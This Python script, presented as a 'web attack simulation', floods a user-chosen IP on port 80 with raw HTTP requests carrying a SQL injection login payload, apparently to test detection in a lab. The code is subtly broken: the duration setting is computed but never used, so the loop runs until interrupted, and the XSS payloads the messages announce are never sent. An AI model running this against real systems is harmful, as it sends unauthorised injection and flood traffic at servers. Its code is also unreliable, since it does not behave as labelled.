import socket
import time

def web_attack_simulation(target_ip, duration=15):
    print(f"🕷️ [Web Attack] Simulating SQL Injection & XSS Payloads against {target_ip}")
    print("⚠️  Sending massive HTTP GET/POST requests containing malicious web payloads...")
    
    end_time = time.time() + duration
    
    payload = (
        "GET /login?user=admin' OR '1'='1 HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Connection: keep-alive\r\n\r\n"
    ).encode()
    
    try:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target_ip, 80))
                # Burst several payloads per connection to simulate an aggressive scanner like SQLMap
                for _ in range(10):
                    s.send(payload)
                s.close()
            except:
                pass
            time.sleep(0.05)
            print("Injecting payloads...", end="\r")
    except KeyboardInterrupt:
        pass
        
    print("\n✅ Web Attack Simulation Complete.")

if __name__ == "__main__":
    ip = input("Enter Target IP (Default: 192.168.24.167): ")
    if not ip.strip(): ip = "192.168.24.167"
    dur = input("Enter Duration (Default: 15): ")
    dur = int(dur) if dur.strip().isdigit() else 15
    web_attack_simulation(ip, dur)
